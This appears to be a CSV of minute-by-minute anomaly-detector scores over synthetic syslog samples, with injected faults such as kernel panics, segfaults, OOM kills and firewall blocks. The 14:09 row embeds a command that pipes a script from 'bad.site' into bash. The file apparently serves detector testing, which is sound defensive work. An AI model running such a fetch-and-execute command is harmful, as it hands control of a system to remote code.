bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 13:24:00,0.9995145867780656,0,0,0.9999894441123176,3,57,cups: Started CUPS Scheduler. || sudo: Started CUPS Scheduler. || dockerd: Rotating log files. || NetworkManager: Started Session c81 of user root. || kernel: Started Cleanup of Temporary Directories. || logrotate: Finished Daily apt download activit
2026-07-01 13:25:00,0.9990564724232025,0,0,0.9999894441123176,3,59,docker: Synced RTC time from system clock. || systemd: kernel: Kernel panic - not syncing: Fatal exception || unix_chkpwd: Finished Daily apt download activities. || smartd: Started CUPS Scheduler. || logrotate: Finished Daily apt download activities
2026-07-01 13:26:00,0.9978221074509459,0,0,0.9999894441123176,3,60,unix_chkpwd: Listening on LVM2 poll daemon socket. || NetworkManager: Accepted publickey for user from 10.0.0.163 port 22 ssh2. || sudo: Accepted publickey for user from 10.0.0.200 port 22 ssh2. || smartd: Finished Daily apt download activities. || u
2026-07-01 13:27:00,0.9965602912617169,0,0,0.9999894441123176,3,60,CRON: Started CUPS Scheduler. || unix_chkpwd: Started CUPS Scheduler. || systemd: Finished Daily apt download activities. || xinetd: kernel: Kernel panic - not syncing: Fatal exception || cups: Started Cleanup of Temporary Directories. || sudo: Synce
2026-07-01 13:28:00,0.998732851502355,0,0,0.9999894441123176,3,65,unattended-upgrades: Listening on LVM2 poll daemon socket. || sudo: Listening on LVM2 poll daemon socket. || ntpd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || CRON: Listening on LVM2 poll daemo
2026-07-01 13:29:00,0.9884434998606934,0,0,0.9999894441123176,3,60,gpm: Started Session c77 of user root. || systemd: Listening on LVM2 poll daemon socket. || CRON: Synced RTC time from system clock. || kernel: Started Session c47 of user root. || redis-server: Started CUPS Scheduler. || ftpd: Started Session c111 o
2026-07-01 13:30:00,0.9923092086360464,0,0,0.9999894441123176,3,59,CRON: Started Session c224 of user root. || sudo: Finished Daily apt download activities. || redis-server: Started Session c184 of user root. || systemd-timesyncd: Synced RTC time from system clock. || logrotate: Started Session c77 of user root. || 
2026-07-01 13:31:00,0.9809054404611526,0,0,0.9999894441123176,3,61,telnetd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started Session c81 of user root. || sshd: Rotating log files. || logrotate: Listening on LVM2 poll daemon socket. || telnetd: Started CUPS Scheduler. || systemd-timesyncd: Fini
2026-07-01 13:32:00,0.9991388760815909,0,0,0.9999894441123176,3,61,logrotate: Listening on LVM2 poll daemon socket. || redis-server: Accepted publickey for user from 10.0.0.26 port 22 ssh2. || redis-server: Synced RTC time from system clock. || smartd: Started Session c185 of user root. || gpm: Started Cleanup of Te
2026-07-01 13:33:00,0.926292785813124,0,0,0.9999894441123176,3,60,docker: Accepted publickey for user from 10.0.0.23 port 22 ssh2. || ftpd: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.226 port 22 ssh2. || docker: Started Cleanup of Temporary Directories. || ntpd: Star
2026-07-01 13:34:00,0.9975099663430789,0,0,0.9999894441123176,3,61,xinetd: Started Cleanup of Temporary Directories. || systemd: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || ftpd: Started Cleanup of Temporary Directories. || named: Finished Daily apt download activities. || C
2026-07-01 13:35:00,0.9995644591164979,0,0,0.9999894441123176,3,62,unix_chkpwd: Started Session c207 of user root. || ufw: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.60059 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || ntpd: Started Session c151 of user root. || ufw: Started CUPS Scheduler. || named: Started Session 
2026-07-01 13:36:00,0.9981212975313335,0,0,0.9999894441123176,3,60,chronyd: Started Session c111 of user root. || telnetd: Started Cleanup of Temporary Directories. || NetworkManager: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || named: Accepted publickey for use
2026-07-01 13:37:00,0.9975377655087093,0,0,0.9999894441123176,3,59,sudo: Started Cleanup of Temporary Directories. || ftpd: Listening on LVM2 poll daemon socket. || CRON: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || logrotate: Accepted publickey for user from 10.0.0.145 po
2026-07-01 13:38:00,0.9991830248418353,0,0,0.9999894441123176,3,63,unattended-upgrades: Finished Daily apt download activities. || xinetd: Rotating log files. || unattended-upgrades: Started CUPS Scheduler. || docker: Listening on LVM2 poll daemon socket. || chronyd: Accepted publickey for user from 10.0.0.124 port 
2026-07-01 13:39:00,0.9964173994444137,0,0,0.9999894441123176,3,60,unix_chkpwd: kernel: Out of memory: Kill process 50883 (python3) score 987 or sacrifice child || smartd: Listening on LVM2 poll daemon socket. || systemd: Synced RTC time from system clock. || NetworkManager: Synced RTC time from system clock. || ftp
2026-07-01 13:40:00,0.9998784065746334,0,0,0.9999894441123176,3,59,sudo: Rotating log files. || CRON: Started CUPS Scheduler. || chronyd: Rotating log files. || rsyslogd: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || logrotate: Accepted publickey for user from 10.0.0.89 port 22 ssh2. || unatten
2026-07-01 13:41:00,0.9995418704700486,0,0,0.9999894441123176,3,59,sudo: Started Session c3 of user root. || logrotate: Rotating log files. || rsyslogd: Rotating log files. || named: Listening on LVM2 poll daemon socket. || cups: Accepted publickey for user from 10.0.0.242 port 22 ssh2. || telnetd: Finished Daily ap
2026-07-01 13:42:00,0.9988601919802599,0,0,0.9999894441123176,3,62,cups: Started Session c83 of user root. || named: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || sshd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || dockerd: Started Session c241 of user root. || systemd-time
2026-07-01 13:43:00,0.9998558713840918,0,0,0.9999894441123176,3,63,docker: Started Session c1 of user root. || CRON: Accepted publickey for user from 10.0.0.171 port 22 ssh2. || redis-server: Accepted publickey for user from 10.0.0.157 port 22 ssh2. || named: Started Cleanup of Temporary Directories. || named: Accep
2026-07-01 13:44:00,0.999876316195593,0,0,0.9999894441123176,3,64,redis-server: Started Session c80 of user root. || telnetd: Rotating log files. || unattended-upgrades: Started Cleanup of Temporary Directories. || rsyslogd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lbl
2026-07-01 13:45:00,0.9998448939750973,0,0,0.9999894441123176,3,59,redis-server: Rotating log files. || gpm: kernel: Kernel panic - not syncing: Fatal exception || logrotate: Started Session c232 of user root. || smartd: Started CUPS Scheduler. || CRON: Started Session c232 of user root. || dockerd: Started Cleanup 
2026-07-01 13:46:00,0.9993333296991959,0,0,0.9999894441123176,3,56,telnetd: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.249 port 22 ssh2. || unix_chkpwd: Started Cleanup of Temporary Directories. || redis-server: Rotating log files. || chronyd: Listening on LVM2 poll d
2026-07-01 13:47:00,0.9990568195080687,0,0,0.9999894441123176,3,58,cups: Rotating log files. || xinetd: Accepted publickey for user from 10.0.0.27 port 22 ssh2. || xinetd: Started Cleanup of Temporary Directories. || docker: Accepted publickey for user from 10.0.0.123 port 22 ssh2. || xinetd: Listening on LVM2 poll 
2026-07-01 13:48:00,0.9992877693406709,0,0,0.9999894441123176,3,60,kernel: Accepted publickey for user from 10.0.0.89 port 22 ssh2. || sudo: Started Session c184 of user root. || CRON: Rotating log files. || logrotate: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || ntpd: Started Cleanup of Temporary
2026-07-01 13:49:00,0.9918464637365739,0,0,0.9999894441123176,3,59,redis-server: Finished Daily apt download activities. || sshd: Rotating log files. || ftpd: Started Session c99 of user root. || sshd: Accepted publickey for user from 10.0.0.181 port 22 ssh2. || systemd-timesyncd: Accepted publickey for user from 10
2026-07-01 13:50:00,0.9970480803433581,0,0,0.9999894441123176,3,62,cups: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || rsyslogd: kernel: Out of memory: Kill process 7953 (python3) score 987 or sacrifice child || systemd-timesyncd: Synced RTC time from system clock. || unix
2026-07-01 13:51:00,0.9972217289912398,0,0,0.9999894441123176,3,59,smartd: Listening on LVM2 poll daemon socket. || ftpd: Started CUPS Scheduler. || unattended-upgrades: Started CUPS Scheduler. || kernel: Finished Daily apt download activities. || sshd: Rotating log files. || ufw: Started Cleanup of Temporary Direct
2026-07-01 13:52:00,0.9999437327008864,0,0,0.9999894441123176,3,61,rsyslogd: Started Session c108 of user root. || redis-server: Started CUPS Scheduler. || logrotate: Started CUPS Scheduler. || dockerd: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || systemd: Accep
2026-07-01 13:53:00,0.9999299447085814,0,0,0.9999894441123176,3,58,unix_chkpwd: Rotating log files. || gpm: Synced RTC time from system clock. || gpm: Started Cleanup of Temporary Directories. || unattended-upgrades: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || NetworkMan
2026-07-01 13:54:00,0.9998768161361312,0,0,0.9999894441123176,3,60,docker: Listening on LVM2 poll daemon socket. || gpm: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || unattended-upgrades: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped
2026-07-01 13:55:00,0.9999823765655533,0,0,0.9999894441123176,3,60,kernel: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time from system clock. || kernel: Rotating log files. || systemd: Listening on LVM2 poll daemon socket. || xinetd: Start
2026-07-01 13:56:00,0.9999640108945411,0,0,0.9999894441123176,3,62,CRON: Accepted publickey for user from 10.0.0.115 port 22 ssh2. || smartd: Finished Daily apt download activities. || sudo: Accepted publickey for user from 10.0.0.130 port 22 ssh2. || smartd: Started Cleanup of Temporary Directories. || NetworkManag
2026-07-01 13:57:00,0.9996969653585663,0,0,0.9999894441123176,3,60,NetworkManager: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || cups: Rotating log files. || cups: Started Cleanup of Temporary Directories. || named: Started CUPS Scheduler. || cups: Rotating log files. || sshd: Rotating lo
2026-07-01 13:58:00,0.9954447068083626,0,0,0.9999894441123176,3,63,ntpd: Rotating log files. || unattended-upgrades: Accepted publickey for user from 10.0.0.15 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock. || logrotate: Accepted publickey for user from 10.0.0.253 port 22 ssh2. || dockerd: 
2026-07-01 13:59:00,0.9922072432306795,0,0,0.9999894441123176,3,60,docker: Synced RTC time from system clock. || unix_chkpwd: Listening on LVM2 poll daemon socket. || cups: Started CUPS Scheduler. || unix_chkpwd: Finished Daily apt download activities. || ftpd: Rotating log files. || ntpd: Started Session c246 of us
2026-07-01 14:00:00,0.9993035685726275,0,0,0.9999894441123176,3,64,ntpd: Listening on LVM2 poll daemon socket. || ufw: Started Session c66 of user root. || docker: Synced RTC time from system clock. || logrotate: Started Session c34 of user root. || kernel: Rotating log files. || NetworkManager: Started Cleanup of T
2026-07-01 14:01:00,0.9996287423412277,0,0,0.9999894441123176,3,59,ntpd: Rotating log files. || dockerd: Listening on LVM2 poll daemon socket. || chronyd: Accepted publickey for user from 10.0.0.87 port 22 ssh2. || rsyslogd: Accepted publickey for user from 10.0.0.94 port 22 ssh2. || docker: Rotating log files. || k
2026-07-01 14:02:00,0.9999503700464674,0,0,0.9999894441123176,3,59,redis-server: Finished Daily apt download activities. || dockerd: Started Session c247 of user root. || chronyd: Started Session c19 of user root. || unix_chkpwd: Started Cleanup of Temporary Directories. || systemd: Listening on LVM2 poll daemon soc
2026-07-01 14:03:00,0.9992803019027259,0,0,0.9999894441123176,3,54,smartd: Rotating log files. || sshd: Listening on LVM2 poll daemon socket. || NetworkManager: Synced RTC time from system clock. || gpm: Listening on LVM2 poll daemon socket. || chronyd: Started Session c217 of user root. || smartd: Synced RTC time f
2026-07-01 14:04:00,0.9995271687229851,0,0,0.9999894441123176,3,62,systemd-timesyncd: Started Cleanup of Temporary Directories. || NetworkManager: Started Cleanup of Temporary Directories. || dockerd: Started CUPS Scheduler. || sudo: Listening on LVM2 poll daemon socket. || logrotate: Started Session c77 of user roo
2026-07-01 14:05:00,0.9997472113458034,0,0,0.9999894441123176,3,64,smartd: Started CUPS Scheduler. || telnetd: Started CUPS Scheduler. || redis-server: Synced RTC time from system clock. || NetworkManager: Finished Daily apt download activities. || systemd: Listening on LVM2 poll daemon socket. || CRON: bash: -c: li
2026-07-01 14:06:00,0.9998828402748585,0,0,0.9999894441123176,3,60,redis-server: Synced RTC time from system clock. || sshd: Accepted publickey for user from 10.0.0.123 port 22 ssh2. || ftpd: Synced RTC time from system clock. || telnetd: Rotating log files. || systemd: EXT4-fs error (device sda1): ext4_find_entry:1
2026-07-01 14:07:00,0.9996626404004257,0,0,0.9999894441123176,3,55,ufw: Accepted publickey for user from 10.0.0.207 port 22 ssh2. || telnetd: Started Session c146 of user root. || logrotate: Listening on LVM2 poll daemon socket. || rsyslogd: Started Cleanup of Temporary Directories. || ntpd: Started Session c204 of 
2026-07-01 14:08:00,0.9999468467921586,0,0,0.9999894441123176,3,58,NetworkManager: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || sudo: Started Session c11 of user root. || gpm: Listening on LVM2 poll daemon socket. || NetworkManager: Finished Daily apt download activities. || docke
2026-07-01 14:09:00,0.9999401342006387,0,0,0.9999894441123176,3,62,dockerd: Finished Daily apt download activities. || ftpd: Started Session c111 of user root. || ntpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || sudo: Synced RTC time from system clock. || kernel: Started Cleanup of Temporary Directo
2026-07-01 14:10:00,0.9999834461240559,0,0,0.9999894441123176,3,60,ufw: Listening on LVM2 poll daemon socket. || chronyd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || docker: Listening on LVM2 poll daemon socket. || NetworkManager: Accepted publickey for user fr
2026-07-01 14:11:00,0.9996259288853104,0,0,0.9999894441123176,3,62,NetworkManager: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || ftpd: Finished Daily apt download activities. || redis-server: Started Session c80 of user root. || sudo: Rotating log files. || systemd-t
2026-07-01 14:12:00,0.9998337507492581,0,0,0.9999894441123176,3,60,chronyd: Started Cleanup of Temporary Directories. || gpm: Finished Daily apt download activities. || systemd-timesyncd: Started Cleanup of Temporary Directories. || kernel: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon
